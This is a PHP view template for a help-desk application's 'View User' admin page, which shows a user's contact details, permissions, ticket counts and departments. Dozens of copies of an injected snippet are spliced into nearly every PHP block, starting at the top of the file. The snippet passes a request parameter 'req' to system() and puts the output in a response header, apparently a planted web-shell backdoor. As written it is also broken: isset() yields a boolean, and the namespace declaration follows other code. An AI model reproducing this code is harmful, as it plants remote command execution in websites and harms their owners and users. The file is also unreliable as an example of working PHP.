<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('View User'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_users')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$user_id = (int) $url->get_item();

if ($user_id == 0) {
	header('Location: ' . $config->get('address') . '/users/');
	exit;
}

$users_array = $users->get(array('id' => $user_id, 'get_other_data'	=> true));

if (count($users_array) == 1) {
	$user = $users_array[0];
	$site->set_title($language->get('View User') . ' - ' . safe_output($user['name']));

}
else {
	header('Location: ' . $config->get('address') . '/users/');
	exit;
}

$departments 			= $users_to_departments->get(array('user_id' => $user_id, 'get_other_data' => true));
$tickets_count			= $tickets->count(array('user_id' => $user_id));
$assigned_tickets_count	= $tickets->count(array('assigned_user_id' => $user_id));

include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">
	<div class="col-md-3">
		<div class="well well-sm">
			<div class="pull-right">
				<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/users/edit/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $user['id']; ?>/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Edit')); ?></a></p>
			</div>	
			<div class="pull-left">
				<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('User')); ?></h4>
			</div>
			<div class="clearfix"></div>

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($user['allow_login']) { ?>
				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Username')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['username']); ?>
				</p>	
				<div class="clearfix"></div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Email')); ?></label>
			<p class="right-result">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['email']); ?>
			</p>	
			<div class="clearfix"></div>
			
			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Email Notifications')); ?></label>
			<p class="right-result">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($user['email_notifications'] == 1) { echo safe_output($language->get('On')); } else { echo safe_output($language->get('Off')); } ?>
			</p>	
			<div class="clearfix"></div>

			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Phone')); ?></label>
			<p class="right-result">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['phone_number']); ?>
			</p>	
			<div class="clearfix"></div>

			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Address')); ?></label>
			<p class="right-result" id="address">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo nl2br(safe_output($user['address'])); ?>
			</p>	
			<div class="clearfix"></div>
			
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($user['allow_login']) { ?>	
				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Permissions')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['permission_group_name']); ?>
				</p>	
				<div class="clearfix"></div>
						
				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Authentication Type')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
						switch ($user['authentication_id']) {		
							case 2:
								echo $language->get('Active Directory');
							break;
							
							case 3:
								echo $language->get('LDAP');
							break;

							case 4:
								echo $language->get('JSON');
							break;
							
							default:
								echo $language->get('Local');
							break;
						}
					?>
				</p>	
				<div class="clearfix"></div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
					
			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Account Added')); ?></label>
			<p class="right-result"><abbr title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_datetime($user['date_added'])); ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(time_ago_in_words($user['date_added'])); ?> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('ago')); ?></abbr></p>	
			<div class="clearfix"></div>
			
			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Tickets')); ?></label>
			<p class="right-result">
				<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/tickets/?user_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $user_id; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $tickets_count; ?></a>
			</p>	
			<div class="clearfix"></div>

			<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Assigned Tickets')); ?></label>
			<p class="right-result">
				<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/tickets/?assigned_user_id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $user_id; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $assigned_tickets_count; ?></a>
			</p>	
			<div class="clearfix"></div>			
			
		</div>
		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_user_sidebar_finish'); ?>

	</div>
	
	<div class="col-md-9">
	
		<div class="panel panel-default">
			<div class="panel-heading">
				<div class="pull-left">
					<h1 class="panel-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user['name']); ?></h1>
				</div>
				<div class="clearfix"></div>
			</div>
			<div class="panel-body">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('gravatar_enabled')) { ?>
					<div class="pull-right">
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $gravatar->setEmail($user['email']); ?>
						<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $gravatar->getUrl(); ?>" alt="Gravatar" />
					</div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_user_details_finish'); ?>

			
				<div class="clearfix"></div>
			
			</div>
		</div>
		
		<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Departments')); ?></h4>
		<section id="no-more-tables">				
			<table class="table table-striped table-bordered">
				<thead>
					<tr>
						<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?></th>
					</tr>
				</thead>
				
				<tbody>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; 
						foreach($departments as $department) { ?>
						<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
							<td data-title="Name" class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_department/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $department['department_id']; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($department['department_name']); ?></a></td>
						</tr>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
				</tbody>
			</table>
		</section>

		<div class="clearfix"></div>
		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_user_content_finish'); ?>
	</div>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>